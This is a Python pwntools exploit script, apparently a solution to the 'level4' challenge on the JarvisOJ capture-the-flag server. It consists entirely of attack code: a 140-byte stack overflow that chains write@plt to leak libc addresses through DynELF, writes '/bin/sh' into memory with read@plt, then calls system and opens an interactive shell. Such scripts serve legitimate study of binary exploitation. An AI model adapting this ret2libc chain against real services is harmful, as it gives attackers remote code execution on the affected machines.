# -*- coding: utf-8 -*-
from pwn import *

conn = remote('pwn2.jarvisoj.com', 9880)
b = ELF('level4')
vulnerable_function_addr = b.symbols['vulnerable_function']
def leak(address):
    payload1 = 140 * 'A' + p32(b.plt['write']) + p32(vulnerable_function_addr) + p32(1) + p32(address) + p32(4)
    conn.send(payload1)
    rcv = conn.recv(4)
    return rcv

d = DynELF(leak, elf=ELF('level4'))

system_real = d.lookup('system', 'libc')

print(system_real) #4150066816

# payload 2 to write /bin/sh to .bss or .data
#real_read = real_write_address - write_libc + read_libc
payload2 = 140 * 'A' + p32(b.plt['read']) + p32(vulnerable_function_addr) + p32(0) + p32(0x0804a01c) + p32(8)
conn.send(payload2)
conn.send('/bin/sh\x00')

# payload 3 to get shell
payload3 = 140 * 'A' + p32(system_real) + 'a' * 4 + p32(0x0804a01c)
conn.send(payload3)
conn.interactive()

